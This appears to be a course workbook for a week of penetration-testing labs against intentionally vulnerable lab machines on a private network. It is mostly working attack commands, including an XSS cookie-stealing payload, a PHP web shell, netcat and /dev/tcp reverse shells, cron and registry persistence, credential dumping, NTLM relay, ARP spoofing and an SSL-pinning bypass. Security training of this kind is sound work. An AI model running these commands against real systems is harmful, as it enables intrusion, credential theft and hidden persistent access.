# ⚙️ VAPT Workflow — Week 4

---

## Workflow Diagram

```
┌──────────────────────────────────────────────────────────────────────┐
│                     WEEK 4 — FULL VAPT CYCLE                         │
│                                                                      │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌─────────┐ │
│  │  Lab 1       │  │  Lab 2       │  │  Lab 3       │  │  Lab 4  │ │
│  │  Advanced    │─▶│  API         │─▶│  PrivEsc &   │─▶│ Network │ │
│  │  Exploitation│  │  Security    │  │  Persistence │  │ Attacks │ │
│  │              │  │              │  │              │  │         │ │
│  │ • XSS→RCE   │  │ • BOLA       │  │ • LinPEAS    │  │• SMB    │ │
│  │ • Buffer OVF │  │ • GraphQL    │  │ • SUID       │  │  Relay  │ │
│  │ • ROP chain  │  │ • JWT bypass │  │ • Cron job   │  │• ARP    │ │
│  └──────────────┘  └──────────────┘  └──────────────┘  └─────────┘ │
│                                                              │        │
│  ┌──────────────┐  ┌──────────────────────────────────────┐ │        │
│  │  Capstone    │  │  Lab 5 — Mobile Testing              │ │        │
│  │  Lame VM     │◀─│                                      │◀┘        │
│  │              │  │ • MobSF static analysis              │          │
│  │ • vsftpd RCE │  │ • Frida SSL bypass                   │          │
│  │ • Samba RCE  │  │ • Drozer IPC testing                 │          │
│  │ • Full report│  └──────────────────────────────────────┘          │
│  └──────────────┘                                                    │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Step-by-Step — All Labs

### Lab 1 — Advanced Exploitation

```bash
# Step 1 — XSS cookie theft
nc -lvp 8888
# Inject: <script>document.location='http://192.168.56.101:8888/?c='+document.cookie</script>

# Step 2 — Upload PHP shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
# Upload via http://192.168.56.104/dvwa/vulnerabilities/upload/

# Step 3 — Execute shell
curl "http://192.168.56.104/dvwa/hackable/uploads/shell.php?cmd=id"

# Step 4 — Full reverse shell
nc -lvp 4444
curl "http://192.168.56.104/dvwa/hackable/uploads/shell.php?cmd=nc+-e+/bin/bash+192.168.56.101+4444"

# Step 5 — Custom PoC modification
# Edit buffer overflow PoC — update OFFSET, LHOST, LPORT, shellcode
# Run: python3 custom_bof.py

# Step 6 — ROP chain documentation
ropper --file /usr/bin/vulnerable_binary --search "pop rdi; ret"
```

---

### Lab 2 — API Security Testing

```bash
# Step 7 — Enumerate API endpoints
# Burp Suite → Spider → look for /api/, /v1/, /graphql

# Step 8 — BOLA test
# Burp Repeater: GET /api/users/1 → change to /api/users/2 with same token

# Step 9 — GraphQL introspection
curl -X POST http://192.168.56.104/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Step 10 — Rate limit test
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://192.168.56.104/api/login \
    -d '{"username":"admin","password":"test"}'
done

# Step 11 — JWT manipulation in Burp Repeater
# Decode → modify alg:none → re-encode → send
```

---

### Lab 3 — Privilege Escalation & Persistence

```bash
# Step 12 — Transfer LinPEAS
python3 -m http.server 8080
# On target: wget http://192.168.56.101:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# Step 13 — SUID exploit
/usr/bin/nmap --interactive
# nmap> !sh

# Step 14 — Windows escalation
msfconsole
msf6 > use exploit/windows/local/always_install_elevated
msf6 > set SESSION 1
msf6 > set LHOST 192.168.56.101
msf6 > run
meterpreter > getsystem
meterpreter > hashdump

# Step 15 — Cron persistence
(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/192.168.56.101/4444 0>&1") | crontab -

# Step 16 — Registry persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdater /t REG_SZ /d "C:\Users\Public\payload32.exe" /f
```

---

### Lab 4 — Network Protocol Attacks

```bash
# Step 17 — Configure Responder
sudo nano /etc/responder/Responder.conf  # SMB=Off, HTTP=Off
sudo responder -I eth0 -rdw

# Step 18 — SMB relay
sudo impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support

# Step 19 — ARP spoofing
sudo ettercap -G
# Hosts → Scan → Add targets → MitM → ARP Poisoning

# Step 20 — Wireshark capture
sudo tshark -i eth0 -w /tmp/collected/capture.pcap -f "net 192.168.56.0/24" -a duration:120

# Step 21 — Crack NTLM hash
hashcat -m 5600 /tmp/ntlm_hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Lab 5 — Mobile Testing

```bash
# Step 22 — Run MobSF
sudo docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Upload APK → http://localhost:8000

# Step 23 — Frida SSL bypass
pip3 install frida-tools --break-system-packages
frida -U -l ssl_bypass.js -f com.target.app --no-pause

# Step 24 — Drozer IPC testing
drozer console connect
dz> run app.package.attacksurface com.target.app
dz> run app.activity.info -a com.target.app
```

---

### Capstone — Metasploitable VM

```bash
# Step 25 — Recon
nmap -A -sV 192.168.56.106

# Step 26 — Exploit vsftpd
msfconsole
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.56.106
msf6 > run

# Step 27 — Evidence collection
sha256sum /tmp/collected/*

# Step 28 — Compile report
# Fill reports/VAPT_Week4_Report.md

---

## Time Estimates

| Lab | Estimated Time |
|-----|---------------|
| Lab 1 — Advanced Exploitation | 45 min |
| Lab 2 — API Security | 45 min |
| Lab 3 — PrivEsc & Persistence | 40 min |
| Lab 4 — Network Attacks | 40 min |
| Lab 5 — Mobile Testing | 30 min |
| Capstone — Metasploitable VM | 45 min |
| Reporting | 60 min |
| **Total** | **~5 hours** |

---
